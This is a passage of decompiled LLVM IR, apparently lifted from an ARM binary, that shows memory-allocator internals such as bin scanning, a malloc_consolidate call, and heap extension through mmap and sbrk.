  br i1 %v2_120b0, label %dec_label_pc_12094, label %dec_label_pc_120b8

dec_label_pc_120b8:                               ; preds = %dec_label_pc_120a0
  %v4_120b8 = mul i32 %v1_12094, 256
  %v5_120b8 = add i32 %v4_120a4, %v4_120b8
  store i32 %v5_120b8, i32* %r3.global-to-local, align 4
  %v1_120bc = add i32 %v5_120b8, 44
  store i32 %v1_120bc, i32* %r0.global-to-local, align 4
  %v0_120c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_120c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_120d0.preheader

dec_label_pc_120d0.preheader:                     ; preds = %.dec_label_pc_120d0.preheader_crit_edge, %dec_label_pc_120b8
  %v0_120c857 = phi i32 [ %v1_120bc, %dec_label_pc_120b8 ], [ %v0_120c857.pre, %.dec_label_pc_120d0.preheader_crit_edge ]
  %v0_120ec = phi i32 [ %v3_120ac, %dec_label_pc_120b8 ], [ %v1_12084, %.dec_label_pc_120d0.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_120c0, %dec_label_pc_120b8 ], [ %v0_12084, %.dec_label_pc_120d0.preheader_crit_edge ]
  %v2_120d054 = and i32 %ip.promoted, %v0_120ec
  %v4_120d056 = icmp eq i32 %v2_120d054, 0
  br i1 %v4_120d056, label %dec_label_pc_120c8, label %dec_label_pc_120d8

dec_label_pc_120c8:                               ; preds = %dec_label_pc_120d0.preheader, %dec_label_pc_120c8
  %v2_120cc59 = phi i32 [ %v2_120cc, %dec_label_pc_120c8 ], [ %ip.promoted, %dec_label_pc_120d0.preheader ]
  %v0_120c858 = phi i32 [ %v1_120c8, %dec_label_pc_120c8 ], [ %v0_120c857, %dec_label_pc_120d0.preheader ]
  %v1_120c8 = add i32 %v0_120c858, 8
  %v2_120cc = mul i32 %v2_120cc59, 2
  %v2_120d0 = and i32 %v2_120cc, %v0_120ec
  %v4_120d0 = icmp eq i32 %v2_120d0, 0
  br i1 %v4_120d0, label %dec_label_pc_120c8, label %dec_label_pc_120d0.dec_label_pc_120d8_crit_edge

dec_label_pc_120d0.dec_label_pc_120d8_crit_edge:  ; preds = %dec_label_pc_120c8
  store i32 %v1_120c8, i32* %r0.global-to-local, align 4
  store i32 %v2_120cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_120d8

dec_label_pc_120d8:                               ; preds = %dec_label_pc_120d0.dec_label_pc_120d8_crit_edge, %dec_label_pc_120d0.preheader
  %v0_120f8 = phi i32 [ %v2_120cc, %dec_label_pc_120d0.dec_label_pc_120d8_crit_edge ], [ %ip.promoted, %dec_label_pc_120d0.preheader ]
  %v0_1211c = phi i32 [ %v1_120c8, %dec_label_pc_120d0.dec_label_pc_120d8_crit_edge ], [ %v0_120c857, %dec_label_pc_120d0.preheader ]
  %v1_120d8 = add i32 %v0_1211c, 12
  %v2_120d8 = inttoptr i32 %v1_120d8 to i32*
  %v3_120d8 = load i32, i32* %v2_120d8, align 4
  store i32 %v3_120d8, i32* @lr, align 4
  %v9_120dc = icmp eq i32 %v3_120d8, %v0_1211c
  br i1 %v9_120dc, label %dec_label_pc_120e4, label %dec_label_pc_12104

dec_label_pc_120e4:                               ; preds = %dec_label_pc_120d8
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r0.global-to-local, align 4
  %v1_120e8 = load i32, i32* @r8, align 4
  %v2_120e8 = add i32 %v1_120e8, ptrtoint (i32* @global_var_219e0.355 to i32)
  %v3_120e8 = inttoptr i32 %v2_120e8 to i32*
  %v4_120e8 = load i32, i32* %v3_120e8, align 4
  %v2_120ec = sub i32 -1, %v0_120f8
  %v3_120ec = and i32 %v0_120ec, %v2_120ec
  store i32 %v3_120ec, i32* @r4, align 4
  %v1_120f0 = load i32, i32* @r5, align 4
  %v4_120f0 = mul i32 %v1_120f0, 4
  %v5_120f0 = add i32 %v4_120f0, %v4_120e8
  store i32 %v5_120f0, i32* %r3.global-to-local, align 4
  %v1_120f4 = add i32 %v0_1211c, 8
  store i32 %v1_120f4, i32* %r0.global-to-local, align 4
  %v2_120f8 = mul i32 %v0_120f8, 2
  store i32 %v2_120f8, i32* %ip.global-to-local, align 4
  %v2_120fc = add i32 %v5_120f0, 820
  %v3_120fc = inttoptr i32 %v2_120fc to i32*
  store i32 %v3_120ec, i32* %v3_120fc, align 4
  %v0_1207c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_12084.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1207c

dec_label_pc_12104:                               ; preds = %dec_label_pc_120d8
  %v1_12104 = add i32 %v3_120d8, 4
  %v2_12104 = inttoptr i32 %v1_12104 to i32*
  %v3_12104 = load i32, i32* %v2_12104, align 4
  store i32 %v3_12104, i32* %r3.global-to-local, align 4
  %v1_12108 = and i32 %v3_12104, -4
  store i32 %v1_12108, i32* %r2.global-to-local, align 4
  %v0_1210c = load i32, i32* @sl, align 4
  %v2_1210c = sub i32 %v1_12108, %v0_1210c
  store i32 %v2_1210c, i32* %ip.global-to-local, align 4
  %v1_12110 = add i32 %v3_120d8, 12
  %v2_12110 = inttoptr i32 %v1_12110 to i32*
  %v3_12110 = load i32, i32* %v2_12110, align 4
  store i32 %v3_12110, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_1210c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_12104
  %v6_12118 = add i32 %v1_12108, %v3_120d8
  store i32 %v6_12118, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_12104, %bb146
  %v2_1211c = add i32 %v3_12110, 8
  %v3_1211c = inttoptr i32 %v2_1211c to i32*
  store i32 %v0_1211c, i32* %v3_1211c, align 4
  %v0_12120 = load i32, i32* %r3.global-to-local, align 4
  %v1_12120 = load i32, i32* %r0.global-to-local, align 4
  %v2_12120 = add i32 %v1_12120, 12
  %v3_12120 = inttoptr i32 %v2_12120 to i32*
  store i32 %v0_12120, i32* %v3_12120, align 4
  %v4_12124 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_12000_crit_edge, label %dec_label_pc_12130

.dec_label_pc_12000_crit_edge:                    ; preds = %bb147
  %v5_12124 = add i32 %v4_12124, 8
  store i32 %v5_12124, i32* %r4.global-to-local, align 4
  %v4_12128 = load i32, i32* %r2.global-to-local, align 4
  %v5_12128 = add i32 %v4_12128, 4
  %v6_12128 = inttoptr i32 %v5_12128 to i32*
  %v7_12128 = load i32, i32* %v6_12128, align 4
  store i32 %v7_12128, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12000

dec_label_pc_12130:                               ; preds = %bb147
  %v1_12130 = load i32, i32* @sl, align 4
  %v2_12130 = add i32 %v1_12130, %v4_12124
  store i32 %v2_12130, i32* %r1.global-to-local, align 4
  %v1_12138 = load i32, i32* @r6, align 4
  %v2_12138 = add i32 %v1_12138, 8
  %v3_12138 = inttoptr i32 %v2_12138 to i32*
  store i32 %v2_12130, i32* %v3_12138, align 4
  %v0_1213c = load i32, i32* %r1.global-to-local, align 4
  %v1_1213c = load i32, i32* @r6, align 4
  %v2_1213c = add i32 %v1_1213c, 12
  %v3_1213c = inttoptr i32 %v2_1213c to i32*
  store i32 %v0_1213c, i32* %v3_1213c, align 4
  %v0_12140 = load i32, i32* @r6, align 4
  %v1_12140 = load i32, i32* %r1.global-to-local, align 4
  %v2_12140 = add i32 %v1_12140, 8
  %v3_12140 = inttoptr i32 %v2_12140 to i32*
  store i32 %v0_12140, i32* %v3_12140, align 4
  %v0_12144 = load i32, i32* @r6, align 4
  %v1_12144 = load i32, i32* %r1.global-to-local, align 4
  %v2_12144 = add i32 %v1_12144, 12
  %v3_12144 = inttoptr i32 %v2_12144 to i32*
  store i32 %v0_12144, i32* %v3_12144, align 4
  %tmp213 = icmp ult i32 %v1_12130, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_12130
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  %v8_12150 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v8_12150, i32* %r3.global-to-local, align 4
  %v4_12154 = load i32, i32* %r1.global-to-local, align 4
  %v6_12154 = add i32 %v8_12150, 48
  %v7_12154 = inttoptr i32 %v6_12154 to i32*
  store i32 %v4_12154, i32* %v7_12154, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_12130, %bb148
  %v0_12158 = load i32, i32* @sl, align 4
  %v1_12158 = or i32 %v0_12158, 1
  store i32 %v1_12158, i32* %r2.global-to-local, align 4
  %v0_1215c = load i32, i32* %ip.global-to-local, align 4
  %v1_1215c = or i32 %v0_1215c, 1
  store i32 %v1_1215c, i32* %r3.global-to-local, align 4
  %v0_12160 = load i32, i32* @lr, align 4
  %v1_12160 = add i32 %v0_12160, 8
  store i32 %v1_12160, i32* %r4.global-to-local, align 4
  %v2_12164 = add i32 %v0_12160, 4
  %v3_12164 = inttoptr i32 %v2_12164 to i32*
  store i32 %v1_12158, i32* %v3_12164, align 4
  %v0_12168 = load i32, i32* %ip.global-to-local, align 4
  %v1_12168 = load i32, i32* %r1.global-to-local, align 4
  %v3_12168 = add i32 %v1_12168, %v0_12168
  %v4_12168 = inttoptr i32 %v3_12168 to i32*
  store i32 %v0_12168, i32* %v4_12168, align 4
  %v0_1216c = load i32, i32* %r3.global-to-local, align 4
  %v1_1216c = load i32, i32* %r1.global-to-local, align 4
  %v2_1216c = add i32 %v1_1216c, 4
  %v3_1216c = inttoptr i32 %v2_1216c to i32*
  store i32 %v0_1216c, i32* %v3_1216c, align 4
  br label %dec_label_pc_125c8

dec_label_pc_12174.loopexit:                      ; preds = %dec_label_pc_12094
  br label %dec_label_pc_12174

dec_label_pc_12174:                               ; preds = %dec_label_pc_12174.loopexit, %dec_label_pc_11d88, %dec_label_pc_11d90
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %ip.global-to-local, align 4
  %v4_1217c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_1217c, i32* @r0, align 4
  %v1_12180 = add i32 %v4_1217c, 44
  %v2_12180 = inttoptr i32 %v1_12180 to i32*
  %v3_12180 = load i32, i32* %v2_12180, align 4
  store i32 %v3_12180, i32* %ip.global-to-local, align 4
  %v1_12184 = add i32 %v3_12180, 4
  %v2_12184 = inttoptr i32 %v1_12184 to i32*
  %v3_12184 = load i32, i32* %v2_12184, align 4
  %v0_12188 = load i32, i32* @sl, align 4
  %v1_12188 = add i32 %v0_12188, 16
  store i32 %v1_12188, i32* %r1.global-to-local, align 4
  %v1_1218c = and i32 %v3_12184, -4
  store i32 %v1_1218c, i32* %r3.global-to-local, align 4
  %v3_12190 = icmp ult i32 %v1_1218c, %v1_12188
  br i1 %v3_12190, label %dec_label_pc_121c0, label %dec_label_pc_1219c

dec_label_pc_1219c:                               ; preds = %dec_label_pc_12174
  %v2_1219c = sub i32 %v1_1218c, %v0_12188
  %v2_121a0 = add i32 %v0_12188, %v3_12180
  store i32 %v2_121a0, i32* %r1.global-to-local, align 4
  %v1_121a4 = or i32 %v2_1219c, 1
  store i32 %v1_121a4, i32* %r3.global-to-local, align 4
  %v1_121a8 = or i32 %v0_12188, 1
  store i32 %v1_121a8, i32* %r2.global-to-local, align 4
  %v1_121ac = add i32 %v3_12180, 8
  store i32 %v1_121ac, i32* %r4.global-to-local, align 4
  store i32 %v1_121a8, i32* %v2_12184, align 4
  %v0_121b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_121b4 = load i32, i32* @r0, align 4
  %v2_121b4 = add i32 %v1_121b4, 44
  %v3_121b4 = inttoptr i32 %v2_121b4 to i32*
  store i32 %v0_121b4, i32* %v3_121b4, align 4
  %v0_121b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_121b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_121b8 = add i32 %v1_121b8, 4
  %v3_121b8 = inttoptr i32 %v2_121b8 to i32*
  store i32 %v0_121b8, i32* %v3_121b8, align 4
  br label %dec_label_pc_125c8

dec_label_pc_121c0:                               ; preds = %dec_label_pc_12174
  %v1_121c0 = inttoptr i32 %v4_1217c to i32*
  %v2_121c0 = load i32, i32* %v1_121c0, align 4
  store i32 %v2_121c0, i32* %r3.global-to-local, align 4
  %v1_121c4 = and i32 %v2_121c0, 2
  store i32 %v1_121c4, i32* %ip.global-to-local, align 4
  %v2_121c4 = icmp eq i32 %v1_121c4, 0
  %v1_121c8 = add i32 %v4_1217c, 860
  %v2_121c8 = inttoptr i32 %v1_121c8 to i32*
  %v3_121c8 = load i32, i32* %v2_121c8, align 4
  store i32 %v3_121c8, i32* %r1.global-to-local, align 4
  br i1 %v2_121c4, label %dec_label_pc_121e0, label %dec_label_pc_121d0

dec_label_pc_121d0:                               ; preds = %dec_label_pc_121c0
  %v0_121d0 = call i32 @__malloc_consolidate()
  %v0_121d4 = load i32, i32* @sl, align 4
  %v1_121d4 = add i32 %v0_121d4, -7
  store i32 %v1_121d4, i32* @r0, align 4
  %v0_121d8 = call i32 @malloc()
  store i32 %v0_121d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125c4

dec_label_pc_121e0:                               ; preds = %dec_label_pc_121c0
  %v1_121e0 = add i32 %v4_1217c, 844
  %v2_121e0 = inttoptr i32 %v1_121e0 to i32*
  %v3_121e0 = load i32, i32* %v2_121e0, align 4
  store i32 %v3_121e0, i32* %r3.global-to-local, align 4
  %v3_121e4 = icmp ult i32 %v0_12188, %v3_121e0
  %v1_121e8 = add i32 %v3_121c8, -1
  store i32 %v1_121e8, i32* %sb.global-to-local, align 4
  br i1 %v3_121e4, label %dec_label_pc_122bc, label %dec_label_pc_121f0

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121e0
  %v1_121f0 = add i32 %v4_1217c, 852
  %v2_121f0 = inttoptr i32 %v1_121f0 to i32*
  %v3_121f0 = load i32, i32* %v2_121f0, align 4
  store i32 %v3_121f0, i32* %r2.global-to-local, align 4
  %v1_121f4 = add i32 %v4_1217c, 848
  %v2_121f4 = inttoptr i32 %v1_121f4 to i32*
  %v3_121f4 = load i32, i32* %v2_121f4, align 4
  store i32 %v3_121f4, i32* %r3.global-to-local, align 4
  %v6_121fc = icmp slt i32 %v3_121f4, %v3_121f0
  br i1 %v6_121fc, label %dec_label_pc_12200, label %dec_label_pc_122bc

dec_label_pc_12200:                               ; preds = %dec_label_pc_121f0
  %v1_12200 = add i32 %v0_12188, 10
  %v2_12204 = add i32 %v1_12200, %v3_121c8
  store i32 %v2_12204, i32* %r3.global-to-local, align 4
  %v2_12208 = sub i32 0, %v3_121c8
  %v3_12208 = and i32 %v2_12204, %v2_12208
  store i32 %v3_12208, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_12208, %v0_12188
  br i1 %tmp214, label %dec_label_pc_12214, label %dec_label_pc_122bc

dec_label_pc_12214:                               ; preds = %dec_label_pc_12200
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12208, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1222c = call i32 @mmap(i32 0, i32 %v3_12208, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1222c, i32* %r0.global-to-local, align 4
  %v7_12230 = icmp eq i32 %v6_1222c, -1
  br i1 %v7_12230, label %dec_label_pc_12214.dec_label_pc_122bc_crit_edge, label %dec_label_pc_12238

dec_label_pc_12214.dec_label_pc_122bc_crit_edge:  ; preds = %dec_label_pc_12214
  %v1_122e0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_122bc

dec_label_pc_12238:                               ; preds = %dec_label_pc_12214
  %v1_12238 = urem i32 %v6_1222c, 8
  store i32 %v1_12238, i32* %r2.global-to-local, align 4
  %v2_12238 = icmp eq i32 %v1_12238, 0
  br i1 %v2_12238, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_12238
  %v2_1223c = sub nsw i32 8, %v1_12238
  store i32 %v2_1223c, i32* %r3.global-to-local, align 4
  %v2_12240 = load i32, i32* @r4, align 4
  %v3_12240 = sub i32 %v2_12240, %v2_1223c
  %v3_12244 = add i32 %v2_1223c, %v6_1222c
  store i32 %v3_12244, i32* %lr.global-to-local, align 4
  %v2_1224c = or i32 %v3_12240, 2
  store i32 %v2_1224c, i32* %r2.global-to-local, align 4
  %v5_12254 = inttoptr i32 %v3_12244 to i32*
  store i32 %v2_1223c, i32* %v5_12254, align 4
  %v1_12258 = load i32, i32* %r2.global-to-local, align 4
  %v2_12258 = load i32, i32* %lr.global-to-local, align 4
  %v3_12258 = add i32 %v2_12258, 4
  %v4_12258 = inttoptr i32 %v3_12258 to i32*
  store i32 %v1_12258, i32* %v4_12258, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_12238
  store i32 %v6_1222c, i32* %lr.global-to-local, align 4
  %v1_1225050 = load i32, i32* @r4, align 4
  %v2_1225051 = or i32 %v1_1225050, 2
  store i32 %v2_1225051, i32* %r3.global-to-local, align 4
  %v3_1225c = inttoptr i32 %v6_1222c to i32*
  store i32 0, i32* %v3_1225c, align 4
  %v1_12260 = load i32, i32* %r3.global-to-local, align 4
  %v2_12260 = load i32, i32* %lr.global-to-local, align 4
  %v3_12260 = add i32 %v2_12260, 4
  %v4_12260 = inttoptr i32 %v3_12260 to i32*
  store i32 %v1_12260, i32* %v4_12260, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1226c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_1226c, i32* %ip.global-to-local, align 4
  %v1_12270 = add i32 %v4_1226c, 848
  %v2_12270 = inttoptr i32 %v1_12270 to i32*
  %v3_12270 = load i32, i32* %v2_12270, align 4
  store i32 %v3_12270, i32* %r3.global-to-local, align 4
  %v1_12274 = add i32 %v4_1226c, 856
  %v2_12274 = inttoptr i32 %v1_12274 to i32*
  %v3_12274 = load i32, i32* %v2_12274, align 4
  store i32 %v3_12274, i32* %r2.global-to-local, align 4
  %v1_12278 = add i32 %v3_12270, 1
  store i32 %v1_12278, i32* %r3.global-to-local, align 4
  %v7_12280 = icmp sgt i32 %v1_12278, %v3_12274
  br i1 %v7_12280, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_12278, i32* %v2_12274, align 4
  %v0_12284.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12284.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_12284 = phi i32 [ %v4_1226c, %.thread30 ], [ %v1_12284.pre, %bb150 ]
  %v0_12284 = phi i32 [ %v1_12278, %.thread30 ], [ %v0_12284.pre, %bb150 ]
  %v2_12284 = add i32 %v1_12284, 848
  %v3_12284 = inttoptr i32 %v2_12284 to i32*
  store i32 %v0_12284, i32* %v3_12284, align 4
  %v0_12288 = load i32, i32* %ip.global-to-local, align 4
  %v1_12288 = add i32 %v0_12288, 868
  %v2_12288 = inttoptr i32 %v1_12288 to i32*
  %v3_12288 = load i32, i32* %v2_12288, align 4
  store i32 %v3_12288, i32* %r3.global-to-local, align 4
  %v1_1228c = add i32 %v0_12288, 880
  %v2_1228c = inttoptr i32 %v1_1228c to i32*
  %v3_1228c = load i32, i32* %v2_1228c, align 4
  store i32 %v3_1228c, i32* %r2.global-to-local, align 4
  %v0_12290 = load i32, i32* @r4, align 4
  %v2_12290 = add i32 %v0_12290, %v3_12288
  store i32 %v2_12290, i32* %r1.global-to-local, align 4
  %v1_12294 = add i32 %v0_12288, 872
  %v2_12294 = inttoptr i32 %v1_12294 to i32*
  %v3_12294 = load i32, i32* %v2_12294, align 4
  store i32 %v3_12294, i32* %r3.global-to-local, align 4
  %v1_1229c = add i32 %v0_12288, 884
  %v2_1229c = inttoptr i32 %v1_1229c to i32*
  %v3_1229c = load i32, i32* %v2_1229c, align 4
  store i32 %v3_1229c, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_12290, %v3_1228c
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_12290, i32* %v2_1228c, align 4
  %v0_122a4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_122a4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_122a4 = phi i32 [ %v0_12288, %bb151 ], [ %v1_122a4.pre, %bb152 ]
  %v0_122a4 = phi i32 [ %v2_12290, %bb151 ], [ %v0_122a4.pre, %bb152 ]
  %v2_122a4 = add i32 %v1_122a4, 868
  %v3_122a4 = inttoptr i32 %v2_122a4 to i32*
  store i32 %v0_122a4, i32* %v3_122a4, align 4
  %v0_122a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_122a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_122a8 = add i32 %v1_122a8, %v0_122a8
  store i32 %v2_122a8, i32* %r1.global-to-local, align 4
  %v1_122ac = load i32, i32* %r2.global-to-local, align 4
  %v0_122b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_122b0 = add i32 %v0_122b0, 8
  store i32 %v1_122b0, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_122a8, %v1_122ac
  br i1 %tmp216, label %bb154, label %dec_label_pc_125c4

bb154:                                            ; preds = %bb153
  %v5_122b4 = load i32, i32* %ip.global-to-local, align 4
  %v6_122b4 = add i32 %v5_122b4, 884
  %v7_122b4 = inttoptr i32 %v6_122b4 to i32*
  store i32 %v2_122a8, i32* %v7_122b4, align 4
  br label %dec_label_pc_125c4

dec_label_pc_122bc:                               ; preds = %dec_label_pc_12200, %dec_label_pc_121e0, %dec_label_pc_12214.dec_label_pc_122bc_crit_edge, %dec_label_pc_121f0
  %v1_122e0 = phi i32 [ %v1_122e0.pre, %dec_label_pc_12214.dec_label_pc_122bc_crit_edge ], [ %v0_12188, %dec_label_pc_121f0 ], [ %v0_12188, %dec_label_pc_121e0 ], [ %v0_12188, %dec_label_pc_12200 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %ip.global-to-local, align 4
  %v4_122c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_122c4, i32* %r3.global-to-local, align 4
  %v1_122c8 = add i32 %v4_122c4, 44
  %v2_122c8 = inttoptr i32 %v1_122c8 to i32*
  %v3_122c8 = load i32, i32* %v2_122c8, align 4
  store i32 %v3_122c8, i32* %r0.global-to-local, align 4
  %v1_122cc = add i32 %v4_122c4, 864
  %v2_122cc = inttoptr i32 %v1_122cc to i32*
  %v3_122cc = load i32, i32* %v2_122cc, align 4
  store i32 %v3_122cc, i32* %r2.global-to-local, align 4
  %v1_122d0 = add i32 %v4_122c4, 840
  %v2_122d0 = inttoptr i32 %v1_122d0 to i32*
  %v3_122d0 = load i32, i32* %v2_122d0, align 4
  store i32 %v3_122d0, i32* %r3.global-to-local, align 4
  %v1_122d4 = add i32 %v3_122c8, 4
  %v2_122d4 = inttoptr i32 %v1_122d4 to i32*
  %v3_122d4 = load i32, i32* %v2_122d4, align 4
  store i32 %v3_122d4, i32* %r1.global-to-local, align 4
  %v1_122dc = urem i32 %v3_122cc, 2
  %v2_122dc = icmp eq i32 %v1_122dc, 0
  %v1_122d8 = add i32 %v1_122e0, 16
  %v2_122e0 = add i32 %v1_122d8, %v3_122d0
  store i32 %v2_122e0, i32* %r3.global-to-local, align 4
  %v1_122e4 = and i32 %v3_122d4, -4
  store i32 %v1_122e4, i32* @r8, align 4
  br i1 %v2_122dc, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_122bc
  %v3_122e8 = sub i32 %v2_122e0, %v1_122e4
  store i32 %v3_122e8, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_122bc, %bb155
  %v0_122ec = phi i32 [ %v2_122e0, %dec_label_pc_122bc ], [ %v3_122e8, %bb155 ]
  %v1_122ec = load i32, i32* %sb.global-to-local, align 4
  %v2_122ec = add i32 %v1_122ec, %v0_122ec
  store i32 %v2_122ec, i32* %r3.global-to-local, align 4
  %v1_122f0 = sub i32 -1, %v1_122ec
  store i32 %v1_122f0, i32* %fp.global-to-local, align 4
  %v2_122f4 = and i32 %v2_122ec, %v1_122f0
  store i32 %v2_122f4, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_122f4, 1
  br i1 %tmp157, label %dec_label_pc_12318, label %dec_label_pc_12304

dec_label_pc_12304:                               ; preds = %bb156
  store i32 %v2_122f4, i32* %r0.global-to-local, align 4
  %v1_12308 = call i32 @__GI_sbrk(i32 %v2_122f4)
  store i32 %v1_12308, i32* %r0.global-to-local, align 4
  %v3_1230c = icmp eq i32 %v1_12308, -1
  store i32 %v1_12308, i32* @r4, align 4
  br i1 %v3_1230c, label %dec_label_pc_12318, label %dec_label_pc_12384

dec_label_pc_12318:                               ; preds = %dec_label_pc_12304, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r1.global-to-local, align 4
  %v4_12320 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_12320, i32* %r6.global-to-local, align 4
  %v1_12324 = add i32 %v4_12320, 864
  %v2_12324 = inttoptr i32 %v1_12324 to i32*
  %v3_12324 = load i32, i32* %v2_12324, align 4
  store i32 %v3_12324, i32* %r3.global-to-local, align 4
  %v1_12328 = urem i32 %v3_12324, 2
  %v2_12328 = icmp eq i32 %v1_12328, 0
  br i1 %v2_12328, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_12318
  %v1_1232c = load i32, i32* @r8, align 4
  %v2_1232c = load i32, i32* %sb.global-to-local, align 4
  %v3_1232c = add i32 %v2_1232c, %v1_1232c
  %v2_12330 = load i32, i32* @r5, align 4
  %v3_12330 = add i32 %v3_1232c, %v2_12330
  store i32 %v3_12330, i32* %r3.global-to-local, align 4
  %v2_12334 = load i32, i32* %fp.global-to-local, align 4
  %v3_12334 = and i32 %v2_12334, %v3_12330
  store i32 %v3_12334, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_12318
  %v0_12338.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_12338 = phi i32 [ %v0_12338.pr, %.thread32thread-pre-split ], [ %v3_12334, %bb158 ]
  %v2_12338 = icmp ugt i32 %v0_12338, 1048575
  br i1 %v2_12338, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_12350 = phi i32 [ %v0_12338, %.thread32 ], [ 1048576, %bb159 ]
  %v1_12340 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_12350, %v1_12340
  br i1 %tmp217, label %dec_label_pc_12348, label %dec_label_pc_125ac

dec_label_pc_12348:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12350, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12364 = call i32 @mmap(i32 0, i32 %v0_12350, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12364, i32* %r0.global-to-local, align 4
  %v3_12368 = icmp eq i32 %v6_12364, -1
  %v8_12368 = icmp eq i32 %v6_12364, -1
  store i32 %v6_12364, i32* @r4, align 4
  br i1 %v8_12368, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_12348
  %v1_12370 = load i32, i32* %r6.global-to-local, align 4
  %v2_12370 = add i32 %v1_12370, 864
  %v3_12370 = inttoptr i32 %v2_12370 to i32*
  %v4_12370 = load i32, i32* %v3_12370, align 4
  %v2_12374 = load i32, i32* @r5, align 4
  %v3_12374 = add i32 %v2_12374, %v6_12364
  store i32 %v3_12374, i32* %r0.global-to-local, align 4
  %v2_12378 = and i32 %v4_12370, -2
  store i32 %v2_12378, i32* %r3.global-to-local, align 4
  store i32 %v2_12378, i32* %v3_12370, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_12348, %bb161
  br i1 %v3_12368, label %dec_label_pc_12384, label %dec_label_pc_12388

dec_label_pc_12384:                               ; preds = %.thread35, %dec_label_pc_12304
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12388

dec_label_pc_12388:                               ; preds = %.thread35, %dec_label_pc_12384
  %v0_12388 = load i32, i32* @r4, align 4
  %v7_12388 = icmp eq i32 %v0_12388, -1
  br i1 %v7_12388, label %dec_label_pc_125ac, label %dec_label_pc_12390

dec_label_pc_12390:                               ; preds = %dec_label_pc_12388
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
